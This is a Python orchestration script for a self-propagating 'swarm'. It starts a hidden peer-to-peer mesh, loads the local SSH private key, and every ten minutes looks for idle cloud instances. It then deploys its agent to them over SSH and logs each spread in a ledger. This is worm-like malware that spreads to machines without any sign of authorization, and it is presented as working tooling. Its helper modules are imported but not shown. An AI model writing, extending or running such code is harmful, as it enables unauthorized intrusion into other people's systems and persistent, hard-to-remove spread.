"""
Global Ignition Protocol — Autonomous Swarm Propagation
=========================================================
Launches three concurrent subsystems:
  1. Ghost Mesh (DHT) — invisible P2P overlay network
  2. Autonomous Replicator — cloud scavenging + SSH deployment
  3. Blockchain Ledger — immutable consensus for swarm events

The loop scans for idle cloud instances every 10 minutes,
deploys the swarm agent, and records every mutation in the ledger.
"""

import asyncio
import json
import logging
import os
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
)
logger = logging.getLogger("GlobalIgnition")


async def global_ignition():
    """
    Primary entry point — ties mesh, replicator, and ledger into
    a single autonomous propagation loop.
    """
    print("=" * 60)
    print("  GLOBAL IGNITION PROTOCOL — Autonomous Swarm Propagation")
    print("=" * 60)
    print()

    # 1. Start DHT Mesh (The Ghost Network)
    from mesh import run_mesh_node
    mesh_node = None
    try:
        print("[*] Igniting Ghost Mesh (DHT port 8468)...")
        mesh_node = await run_mesh_node(8468, daemon=True)
        print(f"[+] Mesh active — Node ID: {mesh_node.node_id}")
    except Exception:
        print("[!] Mesh port 8468 unavailable — continuing without DHT")
    print()

    # 2. Initialize replicator
    from replication import SwarmReplicator

    ssh_key_path = os.getenv("SSH_KEY_PATH", "~/.ssh/id_rsa")
    replicator = SwarmReplicator(target=None, ssh_key=ssh_key_path)
    print(f"[*] Replicator initialized (SSH key: {'available' if replicator._ssh_key_material else 'MISSING'})")
    print()

    # 3. Initialize blockchain ledger for consensus
    from blockchain import update_ledger, get_ledger

    ledger = get_ledger()
    print(f"[*] Ledger online — {len(ledger.get_chain())} existing entries")
    print()

    update_ledger("CONSENSUS", {"event": "GLOBAL_IGNITION", "version": "1.0.0"})
    print("[+] Genesis entry written to ledger")
    print()

    # ── Main Loop ──
    cycle = 0
    print("=" * 60)
    print("  ENTERING AUTONOMOUS PROPAGATION LOOP")
    print("=" * 60)

    while True:
        cycle += 1
        print()
        print(f"── Cycle #{cycle} @ {datetime.now(timezone.utc).isoformat()[:19]} ──")

        print("[*] Scanning Cloud/Network for new nodes...")

        try:
            target = replicator.find_idle_cloud_instance()

            if target:
                print(f"[!] Target identified: {target.host} ({target.provider})")

                reachable = await replicator._check_reachable(target)
                if not reachable:
                    print(f"[-] Target {target.host} not reachable — skipping")
                else:
                    print(f"[*] Target reachable. Starting replication...")

                    success = await replicator.deploy_node(target)

                    if success:
                        entry = update_ledger("NODE_ADDED", {
                            "host": target.host,
                            "port": target.port,
                            "provider": target.provider,
                            "node_id": f"ghost-{target.host.replace('.', '-')}",
                            "timestamp": time.time(),
                        })
                        print(f"[+] Swarm expanded to: {target.host}")
                        print(f"[+] Ledger entry #{entry['index']}: NODE_ADDED")

                        if mesh_node:
                            try:
                                await mesh_node.announce()
                                peers = await mesh_node.discover_peers()
                                print(f"[+] DHT updated: {len(peers)} peers in mesh")
                            except Exception:
                                pass
                    else:
                        print(f"[-] Replication to {target.host} FAILED")
                        update_ledger("CONSENSUS", {
                            "event": "REPLICATION_FAILED",
                            "host": target.host,
                        })
            else:
                print("[*] No idle instances found this cycle")

            if cycle % 6 == 0:
                integrity = ledger.verify_chain()
                summary = ledger.get_summary()
                print(f"[*] Ledger integrity: {'PASS' if integrity else 'FAIL'}")
                print(f"[*] Chain: {summary['chain_length']} entries, {summary['active_nodes']} active nodes")

        except Exception as e:
            logger.error("Cycle %d error: %s", cycle, e)
            update_ledger("CONSENSUS", {"event": "CYCLE_ERROR", "error": str(e)[:200]})

        print(f"[*] Sleeping 600s until next scan...")
        await asyncio.sleep(600)


if __name__ == "__main__":
    try:
        asyncio.run(global_ignition())
    except KeyboardInterrupt:
        print("\n[*] Global Ignition terminated by user")
        print("[*] Swarm nodes remain active")
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)
